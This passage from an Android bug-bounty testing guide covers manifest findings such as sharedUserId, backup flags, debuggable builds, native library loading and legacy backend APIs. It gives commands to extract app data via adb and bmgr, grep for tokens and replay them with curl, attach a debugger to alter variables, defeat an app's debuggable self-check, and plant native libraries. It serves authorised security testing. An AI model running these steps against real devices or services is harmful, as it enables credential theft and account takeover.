- **Test:** Apps with the same `android:sharedUserId` and identical signing certificates share one Linux UID, one permission grant-set, and read each other's private data directories. The target's effective attack surface becomes the **union** of every sibling's exported components, and its effective permission set becomes the union of every sibling's permissions. Then verify which migration branch the *tested device* is on: `sharedUserMaxSdkVersion` only takes effect for installs on API 33+, so the same manifest behaves differently on two devices.
- **How:**
  ```bash
  grep -nE 'sharedUserId|sharedUserMaxSdkVersion' merged.xml
  adb shell dumpsys package com.target.app | grep -E 'sharedUser|userId='
  UID=$(adb shell dumpsys package com.target.app | grep -oE 'userId=[0-9]+' | head -1 | cut -d= -f2)
  adb shell pm list packages -U | grep ":$UID\b"        # the sibling set
  adb shell ps -Z | grep "u0_a$((UID-10000))"
  # confirm the shared grant-set
  for p in com.target.app com.target.helper; do echo "== $p"; \
    adb shell dumpsys package $p | sed -n '/requested permissions/,/runtime permissions/p'; done
  # cross-read (debuggable sibling, or rooted lab device)
  adb shell run-as com.target.helper ls -l /data/data/com.target.app/shared_prefs/
  ```
- **Proof:** Two package names resolving to the same numeric `userId=` in `dumpsys package`, the same `u0_aNNN` in `ps -Z`, and a successful directory listing (or file read) of one package's `/data/data/...` from the other's context.
- **Escalation:** Compromise the weakest sibling -> read the strongest sibling's shared prefs, databases and Keystore-adjacent files, and inherit its permissions. Same UID means the **same Keystore namespace** (-> D12). Combined with a global `android:process` name (D03-038), attacker code executes inside the target's own process. It is also the mechanism behind app-level virtualisation abuse: a guest running under the host UID inherits all host-granted permissions even without declaring them (-> D25).
- **Ruled out when:** No `sharedUserId` is declared; or it is declared alongside `android:sharedUserMaxSdkVersion` **and** the tested device's API level is above that value, confirmed by `dumpsys package` showing a distinct `userId=` per package on that device. Verify this on the device, not from the manifest — the branch is install-time.

### D03-062 · `allowBackup` — the flag is P5; the finding is the credential you extract and replay

| | |
|---|---|
| **Severity ceiling** | **High** (when the extracted artefact is a live refresh or session token); Medium standalone |
| **VRT** | `mobile_security_misconfiguration.auto_backup_allowed_by_default` (**P5**, CWE-919, baseline vector `AV:P/AC:L/PR:H/UI:N/S:U/C:H/I:N/A:N`). Lead instead with `insecure_data_storage.sensitive_application_data_stored_unencrypted.on_internal_storage` (P5) escalated by the acquisition path, or `broken_authentication_and_session_management.authentication_bypass` (P1) once the replayed token returns the victim's data. |
| **Attacker** | AM-11 (physical unlocked + ADB) for the local path; AM-09/AM-05 for the cloud-restore path |
| **Applies to** | Auto Backup from Android 6.0 (API 23). **LEGACY:** `adb backup` is deprecated, gutted on Android 12+ and dead on many OEM builds — prove the extraction on an in-scope OS/device or the report closes as unreproducible. The `bmgr` local-transport route below does **not** need `android:debuggable`. |
| **Maps to** | MASTG-TEST-0262 (static), MASTG-TEST-0216 (empirical restore), MASTG-TECH-0127, MASTG-TECH-0128; MASWE-0006 (CWE-212, CWE-313); MASVS-STORAGE-2; MobSF `app_allowbackup` / `allowbackup_not_set`; H1 **#12617** (account hijacking via ADB backup); drozer `app.package.backup` |

- **Test:** `allowBackup="true"` (and the attribute missing, which defaults to true) is not a finding. The finding is a file in the extracted archive holding a credential, and the replay of that credential against the production API. Bugcrowd's baseline vector is `AV:P` — physical — which is exactly why the flag alone caps at P5; the way above P5 is to remove the physical precondition.
- **How:**
  ```bash
  grep -oE 'android:(allowBackup|fullBackupContent|dataExtractionRules)="[^"]*"' merged.xml
  # legacy adb path (try it, and record whether it works at all on the in-scope device)
  adb backup -f app.ab -noapk -nosystem -noshared com.target.app
  python3 -c "import zlib;open('app.tar','wb').write(zlib.decompress(open('app.ab','rb').read()[24:]))"
  tar tvf app.tar | grep -Ei 'shared_prefs|databases|\.xml|\.db'
  # modern path — bmgr local transport, no debuggable flag needed (MASTG-TECH-0128)
  adb shell bmgr enable true
  adb shell bmgr list transports
  adb shell bmgr transport com.android.localtransport/.LocalTransport
  adb shell bmgr backupnow com.target.app
  adb root && adb pull /data/data/com.android.localtransport/files/1/_full/com.target.app pkg.ab
  tar xvf pkg.ab && grep -rInE '(eyJ[A-Za-z0-9_-]{10,}|refresh_token|session|Bearer)' apps/com.target.app/
  ```
  Then replay: `curl -H "Authorization: Bearer <token>" https://api.target.example/v1/me`.
- **Proof:** The archive path and field name of the recovered token, quoted verbatim, **plus** an HTTP 200 from the production API returning the victim's profile with that token. Or, for the restore variant, `adb restore app.ab` on a second device with the app opening already authenticated.
- **Escalation:** -> D11 (what else is in the archive), D13 (session resumption), D15 (everything the session reaches). To get above P5 you must show the credential surviving into a **cloud** backup or a device-to-device transfer restored on an attacker-controlled device — that removes `AV:P` and is where the severity actually lives.
- **Ruled out when:** Both extraction paths fail on the in-scope device **or** the archive contains nothing that authenticates. Note explicitly which: Google's own invalid-reports page states *"we don't consider it a security vulnerability if an app allows backups"*, Xiaomi lists `allowbackup:True` as out of scope, and Samsung downgrades reports that *"require enabling Developer Mode ... persistently on the device"*. If the only path needed root or developer mode, stop and re-hunt the same data through an exported provider (D07) instead.

### D03-063 · `dataExtractionRules` — cloud backup and device transfer are configured **separately**

| | |
|---|---|
| **Severity ceiling** | **High** (when one channel is excluded and the other is not, and the included set holds auth material) |
| **VRT** | `insecure_data_storage.sensitive_application_data_stored_unencrypted.on_internal_storage` (P5) escalated by the acquisition path; `broken_authentication_and_session_management.authentication_bypass` (P1) on replay |
| **Attacker** | AM-05 / AM-11 |
| **Applies to** | `android:dataExtractionRules` on **API 31+ (Android 12+)**; `android:fullBackupContent` is the pre-31 equivalent and both are commonly present |
| **Maps to** | MASTG-TEST-0262, MASWE-0006, MASVS-STORAGE-2 |

- **Test:** Read the referenced rules file, not the attribute. `allowBackup="true"` with a rules file that excludes `databases/` and `shared_prefs/` is **not** a finding. Conversely, `dataExtractionRules` defines `<cloud-backup>` and `<device-transfer>` as independent sections — an app can exclude the token store from one and not the other, and D2D transfer is the channel with no physical-access precondition.
- **How:**
  ```bash
  grep -oE 'android:(fullBackupContent|dataExtractionRules)="[^"]*"' merged.xml
  cat out/res/xml/data_extraction_rules.xml out/res/xml/backup_rules.xml 2>/dev/null
  # read BOTH sections independently
  xmlstarlet sel -t -c "//data-extraction-rules/cloud-backup"   out/res/xml/data_extraction_rules.xml
  xmlstarlet sel -t -c "//data-extraction-rules/device-transfer" out/res/xml/data_extraction_rules.xml
  # drozer: run app.package.backup -a com.target.app
  ```
  Confirm that the file actually excludes the specific sharedpref/database entries holding tokens:
  ```xml
  <exclude domain="sharedpref" path="auth_prefs.xml"/>
  <exclude domain="database"  path="session.db"/>
  ```
- **Proof:** The rules XML quoted verbatim showing a domain containing credentials that is **included** (or simply not excluded) in at least one of the two sections, combined with the extraction from D03-062 producing that exact file.
- **Escalation:** -> D11, D13, D23 (backup -> modify -> restore is a client-side entitlement/PIN/API-host tampering primitive).
- **Ruled out when:** Both `<cloud-backup>` and `<device-transfer>` explicitly exclude every path holding credentials or PII, verified by an actual `bmgr backupnow` archive that contains none of them. The pre-31 equivalent: `fullBackupContent` excludes them and `dataExtractionRules` is present for API 31+ devices with the same exclusions.

### D03-064 · `android:debuggable` and `android:testOnly` in a shipped build

| | |
|---|---|
| **Severity ceiling** | **High** |
| **VRT** | `insecure_data_storage.sensitive_application_data_stored_unencrypted.on_internal_storage` (P5 as the storage node) escalated by the no-root acquisition path; `broken_authentication_and_session_management.authentication_bypass` (P1) once the recovered token authenticates |
| **Attacker** | AM-11 (physical unlocked with USB debugging) |
| **Applies to** | all. Play blocks debuggable uploads, so this is found most often in enterprise, sideloaded, pre-prod and OEM channels — check every distribution channel in scope, not just the store build. |
| **Maps to** | `developer.android.com/privacy-and-security/risks/android-debuggable`; MobSF `app_in_test_mode` for `testOnly`; drozer `app.package.debuggable` |

- **Test:** A debuggable release lets any local principal attach JDWP, read and rewrite live memory, and `run-as` the package regardless of device root state. `testOnly="true"` means the release pipeline shipped a test artefact — Google's own description is that it *"may expose functionality or data outside of itself that would cause a security hole"*.
- **How:**
  ```bash
  aapt2 dump badging base.apk | grep -E "application-debuggable|testOnly"
  grep -nE 'android:debuggable|android:testOnly' merged.xml
  adb shell dumpsys package com.target.app | grep -i 'flags='       # DEBUGGABLE / TEST_ONLY
  adb shell run-as com.target.app id
  adb shell run-as com.target.app cat /data/data/com.target.app/shared_prefs/*.xml
  adb jdwp                                        # the pid appears only if debuggable
  adb shell am set-debug-app -w com.target.app
  adb forward tcp:8700 jdwp:<pid>
  jdb -connect com.sun.jdi.SocketAttach:hostname=localhost,port=8700
  #   stop in com.target.LoginActivity.onClick ; locals ; next ; set <var> = "..."
  adb shell am clear-debug-app com.target.app     # reset when done
  ```
- **Proof:** `run-as com.target.app cat databases/*.db` returning the private data on a **stock, non-rooted, non-userdebug** device, and `jdb` printing in-process values (session token, PIN, decrypted balance) at a breakpoint. That "no root required" quality is what moves it out of informational.
- **Escalation:** -> D11 (token extraction), D13 (session replay), D12 (Keystore-wrapped material from memory), and a Frida-free instrumentation path for everything else. Note the inverse trick for your own testing: in the debugger, clear `ApplicationInfo.FLAG_DEBUGGABLE` (`flags & ~0x2`) so the app's own self-check sees a non-debuggable process while you stay attached.
- **Ruled out when:** `aapt2 dump badging` reports no `application-debuggable`, `dumpsys package` flags contain neither `DEBUGGABLE` nor `TEST_ONLY`, and `adb shell run-as com.target.app id` returns `run-as: package not debuggable` on every build channel in scope.

### D03-065 · `<uses-native-library>` and `System.load()` from a path outside the APK

| | |
|---|---|
| **Severity ceiling** | **Critical** (when the loaded path is group/other-writable or on external storage) |
| **VRT** | `server_side_injection.remote_code_execution_rce` (P1) is the wrong node for a local load — file the local case under `broken_access_control.privilege_escalation` (null) with the code-execution impact stated, or `client_side_injection.binary_planting.privilege_escalation` (P3) where the planting shape fits |
| **Attacker** | AM-03 / AM-04 (write the file), AM-09 (if the blob is downloaded) |
| **Applies to** | Allow-list enforcement at **targetSdk 24+**; the `<uses-native-library>` manifest declaration is required from **API 31+**. LEGACY: `targetSdk < 24` can still `dlopen` private platform libraries for backward compatibility. |
| **Maps to** | `developer.android.com/about/versions/12/behavior-changes-12` (`<uses-native-library>` required for targetSdk 31+); AOSP "Namespaces for native libraries"; `/system/etc/public.libraries.txt`; CDD 3.1.1 |

- **Test:** From API 31 an app must declare native libraries it loads from outside its own APK. An app that instead `System.load()`s an absolute path outside its APK is loading either a vendor/OEM blob or a file it wrote at runtime — and if that path is writable by anything other than the app's own UID, it is direct native code execution in the app's sandbox.
- **How:**
  ```bash
  grep -n 'uses-native-library' merged.xml
  adb shell cat /system/etc/public.libraries.txt
  adb shell cat /vendor/etc/public.libraries.txt 2>/dev/null
  grep -rnE 'System\.load\(|System\.loadLibrary\(|dlopen' sources/ \
    | grep -vE 'loadLibrary\("(c|m|log|android|jnigraphics)"'
  # then check the writability of every absolute path found
  adb shell ls -lZ /data/local/tmp/<lib>.so /sdcard/<lib>.so 2>/dev/null
  ```
- **Proof:** A `System.load("/data/...")` or `System.load("/storage/...")` call site in jadx, plus `ls -lZ` on that path showing it is group- or other-writable, or on external storage. Then plant a library at that path from a second app and show your code running in the target's process.
- **Escalation:** -> D16 (native review of a non-AOSP library), D17 (if the blob arrives over the network). A `<uses-native-library>` entry is also a direct pointer to OEM-specific native code worth reviewing on its own.
- **Ruled out when:** Every `System.load`/`loadLibrary` call resolves to an APK-internal path (`getApplicationInfo().nativeLibraryDir` or a bare library name), and every declared `<uses-native-library>` names a library under `/system` or `/vendor` that is not writable by any app UID.

### D03-066 · Framework meta-data keys in the merged manifest — the code-delivery configuration hides here

| | |
|---|---|
| **Severity ceiling** | **Critical** (when it shows the code-delivery channel is unauthenticated) |
| **VRT** | `server_side_injection.remote_code_execution_rce` (P1) when an attacker-controllable update channel delivers executable content |
| **Attacker** | AM-09 (malicious backend/CDN) / AM-06 |
| **Applies to** | React Native + Expo, Flutter, CodePush-enabled RN apps |
| **Maps to** | MASTG-TECH-0141 (Inspecting the Merged AndroidManifest), MASTG-TECH-0150; expo `UpdatesConfiguration.kt`; flutter `FlutterActivityLaunchConfigs.java`; `CodePush.java` / `docs/setup-android.md` |

- **Test:** Each cross-platform framework stores security-relevant configuration as `<meta-data>` in the merged manifest. These are routinely missed because they look like build plumbing, and they are the fastest route to a Critical in a cross-platform app.
- **How:**
  ```bash
  grep -nE '<meta-data' merged.xml
  # Expo / expo-updates (from UpdatesConfiguration.kt):
  #   expo.modules.updates.ENABLED
  #   expo.modules.updates.EXPO_UPDATE_URL
  #   expo.modules.updates.EXPO_RUNTIME_VERSION
  #   expo.modules.updates.EXPO_UPDATES_CHECK_ON_LAUNCH
  #   expo.modules.updates.CODE_SIGNING_CERTIFICATE
  #   expo.modules.updates.CODE_SIGNING_METADATA
  #   expo.modules.updates.CODE_SIGNING_INCLUDE_MANIFEST_RESPONSE_CERTIFICATE_CHAIN
  #   expo.modules.updates.CODE_SIGNING_ALLOW_UNSIGNED_MANIFESTS
  #   expo.modules.updates.ENABLE_EXPO_UPDATES_PROTOCOL_V0_COMPATIBILITY_MODE
  #   expo.modules.updates.DISABLE_ANTI_BRICKING_MEASURES
  # Flutter (FlutterActivityLaunchConfigs.java):
  #   flutter_deeplinking_enabled
  #   io.flutter.Entrypoint / io.flutter.EntrypointUri / io.flutter.InitialRoute
  # CodePush lives in strings.xml, not the manifest:
  grep -nE 'CodePushDeploymentKey|CodePushPublicKey|CodePushServerUrl' out/res/values/strings.xml
  ```
- **Proof:** Concrete values — an `EXPO_UPDATE_URL` pointing at a non-TLS or third-party host, `CODE_SIGNING_ALLOW_UNSIGNED_MANIFESTS = true`, a `CodePushServerUrl` you can reach, or `flutter_deeplinking_enabled=true` with no host validation.
- **Escalation:** -> D17 (OTA code delivery) is where the Critical is argued; -> D09 for the Flutter deep-link routing flag.
- **Ruled out when:** The app ships no OTA framework, or `CODE_SIGNING_CERTIFICATE` is present with `CODE_SIGNING_ALLOW_UNSIGNED_MANIFESTS` absent/false, and the update URL is an HTTPS host under the vendor's control with a verified signature check in the update path.

### D03-067 · Manifest-derived backend hosts and API versions — the shadow-API bridge

| | |
|---|---|
| **Severity ceiling** | **Critical** (when the older version bypasses auth entirely) |
| **VRT** | `broken_authentication_and_session_management.authentication_bypass` (P1) / `broken_access_control.idor.*` (P1–P3) / `sensitive_data_exposure.disclosure_of_secrets.pii_leakage_exposure` (VARIES) — file the *weakened control*, never the version difference |
| **Attacker** | AM-01 |
| **Applies to** | any versioned API |
| **Maps to** | Claude-BugHunter `hunt-shadow-api` Stages 1 & 3; the corpus calls this *"the highest-value mobile→backend bridge in the repo"* |

- **Test:** The manifest and its `<meta-data>` / `strings.xml` references are the first place an engagement learns which backend the app talks to — and a mobile app's hardcoded backend calls are frequently an **older API version** than the current web app uses, with weaker auth, weaker rate limits, weaker input validation and more field exposure. Harvest the hosts here, then diff **behaviourally**, not by response shape.
- **How:**
  ```bash
  grep -nE '<meta-data' merged.xml | grep -iE 'url|host|endpoint|api|gateway|base'
  grep -iE 'name="[^"]*(api|key|secret|token|url|host|endpoint|firebase|sender)[^"]*"' out/res/values/strings.xml
  grep -rhoE 'https?://[a-zA-Z0-9./?=_%:-]+' out/res/ sources/ | sort -u | grep -v schemas.android.com
  ```
  Then the four behavioural diffs, same operation, old path vs current path: **auth strength** (does v1 accept no token / an expired token / a lower-privilege token that v2 rejects?), **rate limiting** (burst both — a missing 429 on v1 means throttling was never backported), **input validation** (same injection / oversized payload to both), **field exposure** (does v1 return internal IDs or PII the current version redacted?).
  ```bash
  for v in v1 v2 v3 beta internal legacy old; do
    curl -s -o /dev/null -w "%{http_code} /api/$v/\n" "https://$TARGET/api/$v/"
  done
  curl -s -H "X-API-Version: 1" "https://$TARGET/api/users"
  ```
- **Proof:** A security regression on the old path, demonstrated with the **same** request against both versions side by side, with a body-level diff. Watch the layer-ordering trap on the way: a `400 {"field X is required"}` from an unauthenticated request does **not** prove you passed auth — many stacks run a body parser or sanitiser in front of auth middleware. Re-test with a minimal well-formed `{}` before claiming an auth bypass.
- **Escalation:** -> D15 owns the exploitation; D03's contribution is the host and version inventory. A version difference alone is **Informational** — the weakened control is the finding.
- **Ruled out when:** Every host and version string the manifest and resources yield resolves to the same API surface the current web client uses, and the four behavioural diffs come back identical (auth rejects identically, both throttle, both validate, both redact).

### D03-068 · `REQUEST_INSTALL_PACKAGES` and the update-identity boundary

| | |
|---|---|
| **Severity ceiling** | **Critical** (if the in-app updater fetches and installs an APK over a channel you can control) |
| **VRT** | `server_side_injection.remote_code_execution_rce` (P1) for the attacker-controlled-artefact case |
| **Attacker** | AM-06 / AM-09 |
| **Applies to** | all apps with an out-of-Play update path; on `targetSdk >= 26` the installer requires `REQUEST_INSTALL_PACKAGES` — note whether the target declares it |
| **Maps to** | AOSP security-model paper §4.7.1 item (5): *"an update can only be installed if the new APK is signed with the same identity or by an identity that was delegated by the original signer"*; `developer.android.com/training/permissions/requesting-special` |

- **Test:** Confirm the update path genuinely requires signature continuity, and that no side channel — an in-app updater, an OEM installer hook, a `REQUEST_INSTALL_PACKAGES` flow — installs a differently-signed build under the same package name.
- **How:**
  ```bash
  grep -n 'REQUEST_INSTALL_PACKAGES' merged.xml
  grep -rnE 'PackageInstaller\.Session|ACTION_INSTALL_PACKAGE|application/vnd\.android\.package-archive' sources/
  # platform boundary control
  adb install -r resigned.apk     # must fail
  ```
- **Proof:** `adb install -r` returning `INSTALL_FAILED_UPDATE_INCOMPATIBLE: ... signatures do not match previously installed version` proves the platform boundary holds. A **successful** install proves either the package was uninstalled first (not a finding) or that the app's own updater accepts an unpinned artefact (a finding — show the fetch and the install).
- **Escalation:** -> D17 (in-app update channel), D14 (if the fetch is unpinned). On a `sharedUserId` app this is compromise of every sibling.
- **Ruled out when:** `REQUEST_INSTALL_PACKAGES` is absent and no `PackageInstaller.Session` call sites exist; or the updater verifies the downloaded APK's signing certificate against a pinned digest before invoking the installer, and the fetch is over a pinned channel.

### D03-069 · Rate the reached behaviour, not the manifest attribute — and file the chain in the right order

| | |
|---|---|
| **Severity ceiling** | Support (it governs every other item's severity) |
| **VRT** | n/a — this is the rule for *choosing* the VRT node |
| **Attacker** | n/a |
| **Applies to** | every finding in this chapter |
| **Maps to** | Claude-BugHunter `triage-validation` PRE-SEVERITY GATE, `bugcrowd-reporting` §5 and §8; Bugcrowd's own `broken_access_control.exposed_sensitive_android_intent` node carrying priority **VARIES**, CWE-927 — *"varies"* is the whole game |

- **Test:** Run the pre-severity gate against the **Critical claim**, not against the bug. Substitute your draft title into each question: (1) have I validated the full chain to attacker-attainable impact, or only one primitive in the middle? (2) what does the attacker walk away with, in one concrete sentence? (3) have I reproduced the full chain end to end at least twice? (4) is there an inheritance gate, signature check or audience check still gating the chain — if yes, it is "primitive present" at lower severity, not Critical? (5) has the programme rejected this severity class before?
- **How:** For a D03 finding the gate resolves to three concrete questions, in this order:
  1. **Did a zero-permission app do it?** (D03-006). If only `adb shell am` did it, the severity is zero.
  2. **What did it return or change?** A Cursor with rows, a written file, a session artefact, an outbound request. Not `Status: ok`.
  3. **Does the impact clear the programme's accepted list?** "Any installed app can read the user's contacts from this app without holding `READ_CONTACTS`" clears it. "The app requests `READ_CONTACTS`" does not.

  Then file in chain order: (a) file each primitive as its own report at its standalone severity, with a placeholder cross-reference; (b) file the consumer with the full ATO/RCE narrative at the chained severity, filling in the real primitive IDs; (c) edit each primitive to backfill the consumer's ID. Frame the chain as a **severity amplifier**, not a merge request — one fix equals one bounty.
  ```markdown
  ## Chain partners (filed as separate reports)
  - **submission [UUID-1]** — orphan custom permission `com.target.permission.SYNC` self-granted
  - **submission [UUID-2]** — exported provider `content://com.target.sync` returns session rows
  These primitives have independent fix surfaces and are filed separately per the programme's
  "one fix = one bounty" rule.
  ```
- **Proof:** A documented pass/kill decision per finding, and a report whose first body section is the severity-request paragraph naming the concrete attacker outcome.
- **Escalation:** -> D27 owns the full reporting discipline: the five-screenshot state-change pattern (pre-state, the bug, negative post-state, positive post-state, the side effect), HAR sanitising, and the PII split — mask session cookies and victim identifiers, **leave visible** trace IDs, your own attacker UID, and JSON key names, because the triager needs those to correlate.
- **Ruled out when:** n/a. Two standing rules: do **not** retract a confirmed finding that stopped reproducing because the client patched mid-engagement — keep timestamped pre-patch evidence and say so in a retraction appendix; and never select a VRT node that misrepresents the bug to get a higher default severity, because triagers reassign and may flag it. Pick the most specific *accurate* node, then set technical severity manually.

## Graveyard for this domain

| Observation | Why it is not a finding | What would make it one |
|---|---|---|
| "The app requests excessive permissions" / permission-inventory report | Google's invalid-reports page: *"excessive permissions alone do not have enough of a security impact to qualify for a reward."* HackenProof: *"permissions declared but unused — common in many Android apps and not a security issue."* MASTG-TEST-0254 rates it under the privacy profile. | A dangerous permission the app holds is reachable by a third party through an exported component (D03-031 re-delegation), or the collected data reaches a host not named in the Play Data safety declaration (-> D20). |
| `android:allowBackup="true"` | `mobile_security_misconfiguration.auto_backup_allowed_by_default` = **P5**, vector `AV:P`. Google: *"backups are enabled by default ... we don't consider it a security vulnerability if an app allows backups."* Xiaomi lists it out of scope. `adb backup` is dead on most modern builds. | A demonstrated extraction, on a non-rooted device without developer mode, of a credential that then authenticates against the production API — or the same credential surviving a **cloud** backup restored on an attacker-controlled device, which removes `AV:P` (D03-062). |
| "Component X is exported" | The export is the map, not the territory. Bugcrowd's `broken_access_control.exposed_sensitive_android_intent` is priority **VARIES** precisely because you must demonstrate the effect. ownCloud #145402 listed four and paid nothing. | The sink behind it: an extra reaching a WebView, a URI reaching a fetch, an intent being forwarded, a state change occurring — reached from a zero-permission app (D03-034, then D04–D08). |
| SSL pinning absent or defeatable | `mobile_security_misconfiguration.ssl_certificate_pinning.absent` and `.defeatable` are both **P5**. A user-installed CA is a tester convenience (AM-07), not an attacker. | Not in this domain at all — see D14. The `minSdk<24` user-CA-trust and `<certificates src="user"/>` items there are the reportable shapes. |
| Missing jailbreak/root detection, missing exploit mitigations | `lack_of_binary_hardening.lack_of_jailbreak_detection` and `.lack_of_exploit_mitigations` = **P5**. AM-12 (own rooted device) is not an attack. | Not in this domain — see D22. |
| Malformed-intent crash on an exported component | `application_level_denial_of_service_dos.app_crash.malformed_android_intents` = **P5**. | The same unchecked parcelable reaching a memory-unsafe native parser (-> D16), or the crash being a reliable pre-condition for another primitive. |
| `minSdkVersion` is low | A number is not a bug. The corpus is unanimous: report the legacy issue it enables, at that issue's severity. | A working reproduction of the enabled bypass on an emulator at that API level (D03-002). |
| MASTG-TEST-0255 / -0256 / -0257 (permission minimisation, rationale, auto-reset) | All three carry `status: placeholder` in MASTG — empty stubs with no procedure. Compliance/UX, no attacker primitive. Demote to Informational. | Nothing in a bounty context. Keep as a programme-hygiene note in a pentest/WAPT deliverable where hygiene is a contracted output. |
| `android:sharedUserId` present | Deprecated, yes; a finding, no. Enormously common in OEM and long-lived enterprise families. | The sibling set enumerated on-device (same `userId=` in `dumpsys package`), one sibling identified as lower-assurance, and a cross-read of the privileged sibling's private data demonstrated (D03-061). |
| `QUERY_ALL_PACKAGES` declared | On `targetSdk < 30` package enumeration was free anyway; on ≥ 30 the permission is Play-policy-restricted, which is a policy matter, not a vulnerability. | The package list appearing in a request body to a third-party host (D03-046a), or the list feeding a targeting decision that changes security behaviour. |
| Absence of `android:intentMatchingFlags="enforceIntentFilter"` | Defence-in-depth on API 36+ only; its absence on an app that does not target 36 is meaningless. | A component that trusts intent data and is only reachable because the flag is absent, especially where a **sibling app in the same family sets it** — that sibling comparison converts it from a hardening note to a defect (D03-044). |
| Cleartext permitted / `usesCleartextTraffic="true"` | Manifest flag only. MASTG-TEST-0235's logic is precise and commonly mis-stated: it does **not** fail when the manifest sets it true but an NSC exists, even an empty one. | A captured plaintext request carrying a token or PII — and that finding belongs to D14, not here. D03's job is only to resolve the `@xml/...` reference so D14 can evaluate it. |
| A drozer `app.package.attacksurface` count | An inventory. Informational by construction; the corpus is explicit: do not report standalone. | Each entry driven to an observable effect from a third-party APK (D03-006). |

## Cross-surface joins

- **Orphan custom permission (D03-008) × the provider it guards (D07).** Nobody joins the `comm -23 used.txt defined.txt` output to the provider authority list. The provider reviewer sees `android:readPermission="com.target.X"` and moves on; the permission reviewer sees an undefined string and files it as a hygiene note. Joined, it is: any installed app defines `X`, is granted it silently, and reads the provider — which, if the provider is keyed by a user id, is `broken_access_control.idor.modify_view_sensitive_information_iterable_object_identifiers` at **P1**.
- **`resolveActivity()==null` as a gate (D03-045) × name-only caller trust (D01/D03-030) × implicit-intent hijack (D05).** Three separate "the attacker cannot be there" assumptions that all fail to the same attacker app. The app decides it is safe because nothing else resolves, trusts the caller because the package name matches a prefix, and sends an implicit intent because no competitor is installed. One PoC APK with a chosen `applicationId`, a matching `<intent-filter>` at priority 999, and no `<queries>` entry defeats all three at once. Nobody reviews package visibility and intent resolution together.
- **`sharedUserId` (D03-061) × Android Keystore (D12) × the weakest sibling's exported surface (D04–D07).** Same UID means the same Keystore namespace. The sibling review and the crypto review never meet: the crypto reviewer proves keys are hardware-backed and non-exportable, and the sibling reviewer proves two packages share a UID, and neither states the consequence — that a bug in the low-assurance sibling *uses* the strong sibling's keys through the shared Keystore without ever extracting them.
- **Dangerous-permission inventory (D03-031) × exported component sinks (D04–D07) × the backend (D15).** Permission lists and IPC lists are produced by different passes and stapled together in the report. The join is the confused deputy: the app holds `READ_CONTACTS`/`ACCESS_FINE_LOCATION`/`INTERNET`, an exported component performs the gated action with attacker extras, and the resulting request reaches the backend **with the victim's session attached** — so the same primitive that leaks local data is also an authenticated request generator against D15.
- **Manifest-declared backend hosts (D03-067) × API versioning (D15).** The manifest, `strings.xml` and framework `<meta-data>` are read for secrets, then discarded. They are actually a version inventory: the hardcoded endpoints in a mobile build are routinely an older API generation than the live web client uses, and the four behavioural diffs (auth strength, throttling, validation, field exposure) on that older generation are where a P1 lives. Nobody diffs the mobile-derived host list against the web app's.
- **`<grant-uri-permission pathPrefix="/">` (D03-036) × intent redirection (D08) × FileProvider (D07).** The manifest reviewer records the over-broad grant scope as a hygiene note; the intent reviewer finds a redirect primitive and rates it on "an attacker can make the app start an activity". Joined, the redirect carries a grant flag and the over-broad scope turns one granted URI into arbitrary read across the whole authority.
- **`appop`-gated defensive controls (D03-047) × overlay/tapjacking (D04/D21).** The overlay reviewer tests whether an overlay can be drawn over the target; the permission reviewer records that the app's anti-overlay warning depends on `SYSTEM_ALERT_WINDOW`. The join is that setting the target's own op to `ignore` silently disables its defence with no exception and no user-visible error — so the tapjacking PoC that "failed" on a clean device succeeds on one where the op was flipped.
- **`android:process` global name (D03-038) × `sharedUserId` (D03-061) × native libraries (D16).** Individually: a shared process, a shared UID, a native parser. Together: attacker code from a same-key sibling executing in the target's address space alongside a memory-unsafe parser, which is the OEM-app shape that produces platform-level findings.
- **Account-type squatting (D03-043) × `FLAG_SECURE` and overlay hardening (D04).** The UI-redress reviewer verifies `FLAG_SECURE` and `filterTouchesWhenObscured` and declares the login screen hardened. Neither control touches an authenticator activity rendered *inside the victim's own task* by a squatted account type — the phishing surface survives every overlay defence the app has.

## Sources

- **AOSP / developer.android.com (architecture corpus):** `guide/topics/manifest/permission-element` (protection levels, `knownSigner`, `signatureOrSystem` deprecation at API 23, reverse-DNS naming), `.../manifest-element#uid` (`sharedUserId` deprecation at API 29, `sharedUserMaxSdkVersion`), `.../activity-alias-element`, `.../service-element`, `.../receiver-element`, `.../provider-element` (`<path-permission>`, `<grant-uri-permission>`); `privacy-and-security/risks/custom-permissions` (orphaned permissions, protection-level downgrade, `CustomPermissionTypo`, `android:permission="true"`, CVE-2019-2200), `risks/android-exported`, `risks/access-control-to-exported-components`, `risks/intent-redirection`, `risks/android-debuggable`; `about/versions/12|13|14|16/behavior-changes*` (exported mandatory, `AD_ID` auto-merge, `NEARBY_WIFI_DEVICES` + `neverForLocation`, `USE_EXACT_ALARM`, `USE_FULL_SCREEN_INTENT`, `android:intentMatchingFlags`, `BODY_SENSORS` → `health.*`); `training/permissions/restrict-interactions`, `training/package-visibility`, `guide/topics/data/audit-access`; `health-and-fitness/guides/health-connect/*`; AOSP `Permissions.md` and `AppOps.md` (app-op modes, restriction exemptions, permission flags, role protection); the AOSP security-model paper (§2.3 threat class [T.A2], §4.3.2, §4.3.3, §4.7.1); `android.content.pm.PermissionInfo`; `android.os.Binder`.
- **OWASP MASTG / MASVS:** MASTG-TEST-0216, -0235, -0252, -0254, -0255/-0256/-0257 (placeholder), -0262, -0285, -0286, -0315, -0355, -0364/-0365/-0366; MASTG-KNOW-0017 (including the Uraniborg-derived privileged-permission risk table), -0132/-0133/-0134; MASTG-TECH-0117, -0126, -0127, -0128, -0141, -0150, -0151, -0160/-0161/-0162/-0163; MASTG-TOOL-0004, -0110, -0124; MASWE-0006, -0018, -0026, -0027, -0047, -0066.
- **Bugcrowd VRT (release 2026-07-08, 581 entries) and severity practice:** the full mobile branch pinned at P5; `broken_access_control.exposed_sensitive_android_intent` at VARIES/CWE-927; `mobile_security_misconfiguration.auto_backup_allowed_by_default` at P5 with vector `AV:P/AC:L/PR:H/UI:N/S:U/C:H/I:N/A:N`; the P1/P2 nodes a mobile chain must reach.
- **MITRE ATT&CK Mobile (v18):** T1626/T1626.001 (+ M1013, DET0642), T1453 (+ DET0697, M1012), T1417/T1417.001/T1417.002, T1516, T1541, T1582, T1616, T1624.001, T1629.002, T1630.002, T1636.001–.005, T1642, T1643, T1644, T1430, T1661; S1067 FluBot, Chameleon, Crocodilus S9004, Mandrake.
- **Disclosed reports:** H1 #12617 (ADB-backup account hijacking), #44727, #57918, #97295 (ok.ru re-delegation), #145402 and #377107 (ownCloud), #185862 (Twitter location, "my app has no permissions assigned"), #289000 (Bitwarden signature-permission fix shape), #331302 (Nextcloud package-name `contains()`), #440749 (Mail.Ru permission typo), #499348 (Twitter Lite, Critical), #1161401 (Nextcloud implicit PendingIntent).
